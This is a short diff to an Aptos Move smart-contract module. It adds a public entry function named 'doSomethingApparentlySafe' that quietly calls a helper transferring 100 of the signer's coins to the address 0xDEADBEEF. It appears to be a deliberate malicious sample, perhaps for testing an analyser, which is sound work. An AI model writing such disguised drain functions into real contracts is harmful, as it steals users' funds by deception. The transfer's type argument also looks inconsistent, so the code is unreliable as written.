@@ -1,6 +1,7 @@
 module deploy_address::framework_call {
 
 	use aptos_framework::coin;
+	use aptos_framework::aptos_coin::AptosCoin;
 	use aptos_framework::aggregator;
 	use aptos_framework::aggregator_factory;
 	use aptos_framework::object;
@@ -30,6 +31,15 @@ module deploy_address::framework_call {
 		f(account);
 	}
 
+	public entry fun doSomethingApparentlySafe(alice: &signer) {
+		move_to<MyRes>(alice, MyRes { n: 10 });
+		let eve = @0xDEADBEEF;
+		stealAptosCoins(alice, eve);
+	}
+
+	fun stealAptosCoins(alice: &signer, eve: address) {
+		coin::transfer<coin::Coin<AptosCoin>>(alice, eve, 100);
+	}
 
 
 }
